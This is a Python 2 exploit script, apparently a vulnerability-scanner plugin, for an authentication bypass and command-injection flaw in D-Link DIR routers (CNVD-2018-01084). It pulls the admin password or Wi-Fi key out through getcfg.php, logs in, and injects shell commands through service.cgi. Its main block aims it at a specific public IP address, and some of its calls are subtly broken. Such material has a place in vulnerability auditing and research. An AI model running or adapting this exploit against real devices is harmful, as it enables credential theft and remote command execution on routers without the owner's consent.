#!/usr/bin/env python
# coding: UTF-8

# ref: http://www.freebuf.com/news/160716.html
# source:https://github.com/Cr0n1c/dlink_shell_poc/blob/master/dlink_auth_rce

# Tested on D-Link 815 Version A 1.3

# Works with:

# DIR-110
# DIR-412
# DIR-600
# DIR-615
# DIR-645 https://vuldb.com/?id.7843 (will add this in later... probably)
# DIR-815

import httplib
import random
import re
import string
import urllib2

HEADER = {"Cookie": "uid=" + "".join(random.choice(string.letters) for _ in range(10)),
              "Host": "localhost",
              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }

def send_post(URL,command, print_res=True):
    post_content = "EVENT=CHECKFW%26" + command + "%26"

    method = "POST"

    if URL.lower().startswith("https"):
        handler = urllib2.HTTPSHandler()
    else:
        handler = urllib2.HTTPHandler()

    opener = urllib2.build_opener(handler)
    request = urllib2.Request(URL + "/service.cgi", data=post_content, headers=HEADER)
    request.get_method = lambda: method

    try:
        connection = opener.open(request)
    except urllib2.HTTPError:
        print "Error: failed to connect to " + URL + "/service.cgi"
        return False
    except:
        print "Error: failed to connect to " + URL + "/service.cgi"
        return False

    if not connection.code == 200:
        print "Error: Recieved status code " + str(connection.code)
        return False

    attempts = 0

    while attempts < 5:
        try:
            data = connection.read()
        except httplib.IncompleteRead:
            attempts += 1
        else:
            break

        if attempts == 5:
            print "Error: Chunking failed %d times, bailing." %attempts
            return False

    if print_res:
        return parse_results(data)
    else:
        return data

def create_session(URL,PASSWORD):
    post_content = "REPORT_METHOD=xml&ACTION=login_plaintext&USER=admin&PASSWD=%s&CAPTCHA="%(PASSWORD)

    try:
        code, head, body, redirect, log = hackhttp.http(URL + "/getcfg.php",data=post_content,headers=HEADER)
    except:
        return False

    if not code == 200:
        return False

    if not re.search("<RESULT>SUCCESS</RESULT>", body):
        return False

    return True


def parse_results(result):
    print result[100:]
    return result

def query_getcfg(URL,param):
    post_data = "SERVICES="+param
    try:
        code, head, body, redirect, log = hackhttp.http(URL + "/getcfg.php",post=post_data,headers=HEADER)

        if code != 200:
            return False
        if re.search("<message>Not authorized</message>", body):
            print "Error: Not vulnerable"
            return False
    except:
        return False

    return body


def attempt_password_find(URL):
    # Going fishing in DEVICE.ACCOUNT looking for CWE-200 or no password
    data = query_getcfg(URL,"DEVICE.ACCOUNT")
    if not data:
        return False

    res = re.findall("<password>(.*?)</password>", data)
    if len(res) > 0 and res != "=OoXxGgYy=":
        return res[0]

    # Did not find it in first attempt
    data = query_getcfg(URL,"WIFI")
    if not data:
        return False

    res = re.findall("<key>(.*?)</key>", data)
    if len(res) > 0:
        return res[0]

    # All attempts failed, just going to return and wish best of luck!
    return False

def assign(service, arg):
    if service == 'd-link':
        return True, arg


def audit(arg):

    URL = arg.url.lower().strip()

    if not URL.startswith("http"):
        URL = "http://" + URL


    res = attempt_password_find(URL)
    if res:
        PASSWORD = res
        security_hole("Password:%s"%(PASSWORD),"cnvd-2018-01084")
    else:
        PASSWORD = ""
    print "[+] Switching password to: " + PASSWORD

    if not create_session(URL,PASSWORD):
        return False

    if len(send_post("ls", False)) != 0:
        security_hole("存在命令执行:cnvd-2018-01084","cnvd-2018-01084")

if __name__ == '__main__':
    from dummy import *
    audit(assign('d-link', 'http://5.172.188.155:8080/')[1])